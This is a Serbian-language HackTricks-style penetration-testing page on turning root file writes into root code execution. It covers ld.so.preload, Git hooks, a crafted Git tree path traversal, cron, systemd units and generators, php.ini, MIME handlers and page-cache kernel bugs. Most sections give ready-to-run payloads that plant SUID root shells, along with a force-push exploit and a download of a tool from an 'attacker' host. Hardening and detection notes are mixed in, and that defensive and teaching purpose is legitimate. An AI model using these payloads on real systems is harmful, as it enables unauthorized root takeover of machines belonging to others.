# Proizvoljni upis u Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` je sistemska lista shared objects koju dynamic linker učitava pre drugih shared objects. Secure-execution mode primenjuje dodatna ograničenja na preloading, tako da putanja biblioteke kao što je `/tmp/pe.so` nije univerzalna tehnika za SUID-binary.\
Ako možete da kreirate ili izmenite ovu datoteku, proces koji je učita učitaće navedenu biblioteku pre svojih drugih shared objects, što omogućava izvršavanje koda u kontekstu tog procesa.<sup>[[12]](#references)</sup>

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** su izvršne skripte koje se pokreću za događaje u repository-ju, uključujući commit i merge operacije. Ako **privilegovani script ili korisnik** izvršava te radnje, a napadač može da **piše u `.git` folder**, hook može da se koristi za **eskalaciju privilegija**.<sup>[[13]](#references)</sup>

Na primer, moguće je **generisati script** u git repo-u, u direktorijumu **`.git/hooks`**, tako da se uvek izvrši kada se kreira novi commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Traversal putanje pri izvozu privilegovanog Git stabla

Privilegovani synchronizer može izbeći checkout i umesto toga enumerisati repository pod uticajem napadača pomoću `git ls-tree`, pročitati svaki blob pomoću `git cat-file`, spojiti prijavljenu putanju sa staging direktorijumom i sam je upisati. Ovo postaje **arbitrary file write sa privilegijama synchronizer-a** kada kombinuje `-c safe.directory=*` (čime se onemogućava Git-ova zaštita repository-ja sa drugim vlasnikom) sa nepostojanjem provere ograničenja odredišta. Ime tree-entry-ja sa apsolutnom putanjom uzrokuje da Python-ov `os.path.join(stage, name)` odbaci `stage`; relativno ime koje sadrži `../` izlazi iz dozvoljene putanje kada ga filesystem razreši. Pošto aplikacija materijalizuje sirovo stablo umesto da zatraži od Git-a da ga checkout-uje, odbijanje putanja tokom checkout-a nikada ne štiti sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Potražite ovaj oblik koda u root servisima, timer-ima, deployment agentima, importerima template-a i backup/restore job-ovima:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Stavka tree-ja kodira se kao `<mode> SP <name> NUL <raw object ID>`. Opcija `git hash-object --literally` namerno dozvoljava podatke objekta koje normalno parsiranje ili `git fsck` mogu odbaciti, pa disposable clone može da konstruiše tree čiji je naziv fajla apsolutna destinacija. Ovaj primer kreira blob cron-fajla, umotava izrađeni tree u commit i pomera branch na njega; eksploatacija i dalje zahteva dozvolu za ažuriranje repository-ja koji koristi privilegovani job i Git server koji prihvata neispravan objekat.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Hardening mora da obuhvati i preuzimanje sadržaja iz repository-ja i završnu operaciju nad filesystem-om:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Zamenite `safe.directory=*` tačnim repository-jima kojima servis mora da veruje i, gde je moguće, obrađujte repository bez root privilegija.
- Odbijte apsolutne nazive i svaku komponentu `.` ili `..` pre materializacije. Nakon spajanja, kanonikalizujte putanju i proverite da odredište ostaje unutar predviđenog root-a.
- Izbegavajte symlink race uslove tipa check-then-open: otvarajte relativno u odnosu na trusted directory descriptor i, na Linux-u, koristite `openat2()` sa `RESOLVE_BENEATH` i `RESOLVE_NO_SYMLINKS` za putanje pod kontrolom napadača.
- Dajte prednost normalnom checkout-u u izolovanom direktorijumu u odnosu na ponovnu implementaciju checkout-a iz plumbing output-a. Ako je raw-object ingestion neophodan, uključite validaciju na receive strani kao što je `receive.fsckObjects=true`; nemojte snižavati `receive.fsck.*` nalaze povezane sa putanjama, koji su potrebni za odbijanje posebno izrađenih tree-ova.

### Cron i vremenske datoteke

Ako možete da **upisujete cron-related datoteke koje root izvršava**, obično možete dobiti code execution pri sledećem pokretanju job-a. Zanimljive mete obuhvataju:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root-ov sopstveni crontab u `/var/spool/cron/` ili `/var/spool/cron/crontabs/`
- `systemd` timers i servise koje oni pokreću

Brze provere:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipični načini zloupotrebe:

- **Dodavanje novog root cron job-a** u `/etc/crontab` ili datoteku u `/etc/cron.d/`
- **Zamena skripte** koju `run-parts` već izvršava
- **Backdoor postojećeg timer target-a** izmenom skripte ili binarnog fajla koji pokreće

Minimalni primer cron payload-a:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ako možete da pišete samo u cron direktorijumu koji koristi `run-parts`, umesto toga tamo postavite izvršnu datoteku:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Napomene:

- `run-parts` obično ignoriše nazive datoteka koji sadrže tačke, zato prednost dajte nazivima kao što je `backup`, umesto `backup.sh`.<sup>[[15]](#references)</sup>
- Neki sistemi koriste `systemd` timere umesto klasičnog crona, ali ideja zloupotrebe je ista: **izmeniti ono što će root kasnije izvršiti**.<sup>[[20]](#references)</sup>

### Service & Socket files

Ako možete da upisujete u **`systemd` unit files** ili datoteke na koje one upućuju, možda ćete moći da dobijete izvršavanje koda kao root ponovnim učitavanjem i restartovanjem unita ili čekanjem da se aktivira putanja za aktivaciju servisa/socket-a.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Zanimljive mete uključuju:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in override-i u `/etc/systemd/system/<unit>.d/*.conf`
- Service skripte/binarne datoteke na koje upućuju `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` putanje koje učitava root servis

Brze provere:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Uobičajeni načini zloupotrebe:

- **Overwrite `ExecStart=`** u service unit-u u vlasništvu root-a koji možete da menjate
- **Add a drop-in override** sa zlonamernim `ExecStart=` i prvo obrišite stari
- **Backdoor** skriptu/binarni fajl na koji unit već upućuje
- **Hijack a socket-activated service** izmenom odgovarajućeg `.service` fajla koji se pokreće kada socket primi konekciju

Primer zlonamernog override-a:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipičan tok aktivacije:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ako ne možete sami da restartujete servise, ali možete da izmenite socket-activated unit, možda je dovoljno samo da **sačekate konekciju klijenta** kako biste pokrenuli izvršavanje backdoored servisa kao root.<sup>[[17]](#references)</sup>

### systemd generator direktorijumi

**System generators** su izvršne datoteke koje system manager pokreće pre učitavanja unit fajlova, tokom boot-a i reloadovanja konfiguracije. Zbog toga je write access nad system-generator direktorijumom (ili nad postojećim izvršnim generatorom) direktan primitive za izvršavanje koda kao root, koji se lako može prevideti kada audit proverava samo `*.service` i `*.timer` fajlove.<sup>[[35]](#references)[[36]](#references)</sup>

Uobičajeni redosled pretrage je `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` i `/usr/lib/systemd/system-generators/` (neke distribucije izlažu `/lib/systemd/system-generators/` preko `/usr` merge-a). Izvršna datoteka sa istim imenom u ranijem direktorijumu zasenjuje onu iz kasnijeg direktorijuma. Nemojte mešati ove **input executable direktorijume** sa `/run/systemd/generator`, `/run/systemd/generator.early` i `/run/systemd/generator.late`, koji sadrže privremeni unit output koji generišu generatori.<sup>[[35]](#references)</sup>

Brze provere:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
Novokreirani generator mora imati postavljen izvršni bit. Ako write primitive kontroliše bajtove, ali ne i režim, ciljaj već izvršni generator; njegovo skraćivanje na mestu obično čuva njegove metapodatke. Ako je sam direktorijum upisiv, kreiraj novi unos i označi ga kao izvršan.<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
Pokretanje `systemctl daemon-reload` nad **system** managerom zahteva odgovarajuću autorizaciju, ali ponovo pokreće svaki system generator; u suprotnom sačekajte privilegovani reload, package operaciju ili reboot. User-generator direktorijumi kao što je `~/.config/systemd/user-generators/` izvršavaju se u okviru user managera i sami po sebi ne obezbeđuju root pristup.<sup>[[35]](#references)</sup>

Za hardening i hunting proverite svaku komponentu putanje i ACL, a ne samo bitove konačnih permissiona, napravite baseline hash-eva i package ownership-a generatora i generišite upozorenja pri kreiranju, preimenovanju, promeni sadržaja ili permissiona u svim system-generator input direktorijumima. Monitoring upisa je važan zato što one-shot generator može da se obriše nakon izvršavanja, dok se generisano stablo unit-a u direktorijumu `/run/systemd/generator*` ponovo kreira pri sledećem reload-u.<sup>[[35]](#references)[[36]](#references)</sup>

### Prepišite restriktivni `php.ini` koji koristi privilegovani PHP sandbox

Neki custom daemon-i proveravaju PHP koji je dostavio user tako što pokreću `php` sa **restriktivnim `php.ini`** fajlom (na primer, `disable_functions=exec,system,...`). Ako sandboxed kod i dalje ima **bilo koji write primitive** (kao što je `file_put_contents`) i možete da dođete do **tačne putanje `php.ini`** koju daemon koristi, možete **prepisati tu konfiguraciju** da biste uklonili restrikcije, a zatim poslati drugi payload koji se izvršava sa povišenim privilegijama.<sup>[[2]](#references)</sup>

Tipičan tok:

1. Prvi payload prepisuje sandbox konfiguraciju.
2. Drugi payload izvršava kod nakon što su opasne funkcije ponovo omogućene.

Minimalan primer (zamenite putanju koju daemon koristi):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ako daemon radi kao root (ili validira koristeći putanje u vlasništvu root-a), drugo izvršavanje daje root kontekst. To je u suštini **privilege escalation via config overwrite** kada sandboxed runtime i dalje može da upisuje datoteke.

### binfmt_misc

`binfmt_misc` izlaže registracije u okviru `/proc/sys/fs/binfmt_misc`; svaka registracija povezuje obrazac tipa datoteke sa interpreterom. Uticaj na privilegije zavisi od toga ko može da menja registraciju i koji proces kasnije izvršava odgovarajuću datoteku, zato proverite te uslove pre nego što ovo smatrate putem za privilege escalation.<sup>[[21]](#references)</sup>

### Overwrite schema handlers (like http: or https:)

Desktop okruženja koriste MIME asocijacije i desktop unose da bi izabrala aplikaciju za URI šeme; napadač koji može da upisuje u relevantnu konfiguraciju po korisniku i direktorijume sa desktop unosima može da preusmeri te šeme na launcher koji kontroliše. Izmenom datoteke `$HOME/.config/mimeapps.list` tako da HTTP i HTTPS URL handleri upućuju na zlonamernu datoteku (na primer, `x-scheme-handler/http=evil.desktop` i `x-scheme-handler/https=evil.desktop`), klik korisnika može da pozove taj desktop unos.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root izvršava skripte/binarne fajlove koje korisnik može da menja

Ako privilegovani workflow pokreće nešto poput `/bin/sh /home/username/.../script` (ili bilo koji binary unutar direktorijuma čiji je vlasnik neprivilegovani korisnik), možete ga preuzeti:<sup>[[1]](#references)</sup>

- **Detektujte izvršavanje:** nadgledajte procese pomoću pspy da biste uhvatili root pri pozivanju putanja pod kontrolom korisnika.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potvrdite mogućnost upisivanja:** proverite da li su i ciljna datoteka i njen direktorijum u vlasništvu vašeg korisnika ili da li vaš korisnik ima dozvolu za upis.
- **Preotmite cilj:** napravite rezervnu kopiju originalnog binary/script-a i postavite payload koji kreira SUID shell (ili izvršava bilo koju drugu root radnju), zatim vratite dozvole:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Pokrenite privilegovanu radnju** (npr. pritiskom na UI dugme koje pokreće helper). Kada root ponovo izvrši hijacked putanju, preuzmite escalated shell pomoću `./rootshell -p`.

### Izmena privilegovanih binarnih fajlova samo u page cache-u

Neki kernel bugovi ne menjaju fajl **na disku**. Umesto toga, omogućavaju izmenu samo **kopije u page cache-u** čitljivog fajla. Ako možete ciljati **setuid** ili na drugi način **root-executed** binarni fajl, sledeće izvršavanje može pokrenuti bytes pod kontrolom napadača iz memorije i omogućiti privilege escalation, iako hash fajla na disku ostaje nepromenjen.<sup>[[3]](#references)[[4]](#references)</sup>

O ovome je korisno razmišljati kao o **runtime-only file write primitive**:<sup>[[3]](#references)</sup>

- **Disk ostaje čist**: inode i bytes na disku se ne menjaju
- **Memorija je izmenjena**: procesi koji čitaju ili izvršavaju keširanu stranicu dobijaju sadržaj koji je izmenio napadač
- **Efekat je privremen**: izmena nestaje nakon reboot-a ili eviction-a cache-a

Ova primitive se nalazi između klasičnog **arbitrary file write** i starijih bugova za **page-cache abuse**, kao što su Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW se oslanjao na race
- Dirty Pipe je imao ograničenja u poziciji upisa
- Primitive koja menja samo page cache može biti pouzdanija ako vulnerable path omogućava direktne upise u cached file-backed pages

#### Generic privesc flow

1. Nabavite kernel primitive koja može da upisuje u **file-backed page cache pages**
2. Iskoristite je protiv **readable privileged binary** fajla ili drugog root-executed fajla
3. Pokrenite izvršavanje **pre** nego što page bude evicted iz cache-a
4. Dobijte code execution kao root dok fajl na disku i dalje izgleda neizmenjeno

Tipične high-value mete:

- **setuid-root** binarni fajlovi
- Helper-i koje pokreću **root services**
- Binarni fajlovi koji se često izvršavaju iz **containers** koji dele host kernel/page cache

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) je dobar primer ove klase. Vulnerable path nalazio se u Linux crypto userspace API-ju (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` može premestiti reference na page-cache pages iz readable fajla u crypto TX scatterlist
- in-place `algif_aead` decrypt path ponovo je koristio source i destination buffere
- `authencesn` je zatim upisivao u destination tag region
- kada je taj region i dalje referencirao spliced file-backed pages, upis je završavao u **page cache-u ciljnog fajla**

Zato zanimljiva tehnika nije sam CVE, već obrazac:

- **ubacite file-backed cache pages u kernel subsystem**
- učinite da ih subsystem **tretira kao writable output**
- pokrenite mali kontrolisani overwrite u memoriji

Javni PoC je koristio ponovljene **4-byte writes** za patchovanje `/usr/bin/su` u memoriji, a zatim ga je izvršio.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) prikazuje drugu varijantu istog **page-cache-only write-to-root** obrasca, ali je ovog puta sink **IPsec ESP decrypt**, umesto `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Važna tehnika je korak **metadata-laundering**:

- `splice()` postavlja **read-only file-backed page-cache page** u ESP-in-UDP packet
- originalna DirtyFrag mitigation je označavala taj skb sa `SKBFL_SHARED_FRAG`, kako bi `esp_input()` radio **copy before decrypting**
- netfilter `TEE` duplira packet kroz `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone zadržava **istu fizičku page-cache referencu**, ali gubi `SKBFL_SHARED_FRAG`
- `esp_input()` zatim tretira clone kao bezbedan i izvršava **in-place `cbc(aes)` decrypt** preko file-backed page-a

Zato je lekcija za review šira od samog CVE-a: ako se mitigation oslanja na **skb/page metadata** da bi odlučio da li operacija prvo mora da izvrši copy, svaki **clone/copy path koji zadrži backing page, ali ukloni metadata** može neprimetno ponovo otvoriti write primitive.

Tipičan exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` za dobijanje **`CAP_NET_ADMIN` unutar private network namespace-a**
2. podignite loopback i instalirajte **netfilter `TEE` rule** u `mangle/OUTPUT`
3. instalirajte **XFRM ESP transport SAs** preko `NETLINK_XFRM`
4. enkodujte svaku ciljnu 4-byte reč u SA `seq_hi` field (DirtyFrag-ov word-selection trick)
5. pošaljite spliced ESP-in-UDP packet tako da **TEE clone** stigne do `esp_input()` i izvrši decrypt **in place**
6. ponavljajte postupak dok page-cache kopija fajla `/usr/bin/su` ili drugog privilegovanog executable-a ne bude sadržala code pod kontrolom napadača

Operativno, impact je isti kao u `AF_ALG` primeru: fajl na disku ostaje čist, ali `execve()` koristi **izmenjene bytes iz page cache-a** i daje root.<sup>[[8]](#references)[[9]](#references)</sup>

Korisne provere izloženosti za ovu varijantu:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Smanjenje napadne površine kratkoročno je i ovde specifično za putanju: nadogradnja na kernel koji sadrži `48f6a5356a33` popravlja clone putanju, dok blokiranje autoload-a za `xt_TEE` uklanja **korak pranja zastavica**, a blokiranje `esp4` / `esp6` uklanja **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Izloženost i hunting

Ako sumnjate na ovu klasu bug-a, nemojte se oslanjati samo na provere integriteta diska. Takođe proverite:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Vrednosti konfiguracije u nastavku razlikuju loadable interfejs od onog ugrađenog u kernel; crypto build rules mapiraju `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` može da se učita ili ukloni kao module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs je ugrađen u kernel
- setuid binaries su dobre mete jer page-cache-only patch može biti dovoljan da lokalni foothold pretvori u root

#### Smanjenje attack surface-a za `algif_aead` path

Ako vulnerable interfejs obezbeđuje loadable module:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Ako je kompajlirano u kernel, neki disclosures su prijavili blokiranje init putanje pomoću:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Ovu vrstu mitigation-a vredi zapamtiti i za druge kernel LPE-ove: ako exploitation zavisi od određenog optional interface-a, disabling ili blacklisting tog interface-a može prekinuti exploit path čak i pre nego što je dostupan potpuni kernel upgrade.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – preuzimanje skripte koja se izvršava kao root u PaperCut direktorijumu u koji korisnik može da upisuje](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security objava za CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable ispravka: crypto: algif_aead - vraćanje na rad out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint tehnički writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analiza i exploitation Linux LPE varijante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux ispravka: net: skb: očuvanje `SKBFL_SHARED_FRAG` u `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Ranija Linux mitigation: postavljanje `SKBFL_SHARED_FRAG` za spliced UDP pakete (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel dokumentacija](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: ranjivost Linux kernela u AF_ALG page cache-u](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` dokumentacija](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` dokumentacija](https://git-scm.com/docs/git-ls-tree)
- [33] [Git configuration dokumentacija](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator dokumentacija](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: mehanizmi persistence-a](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
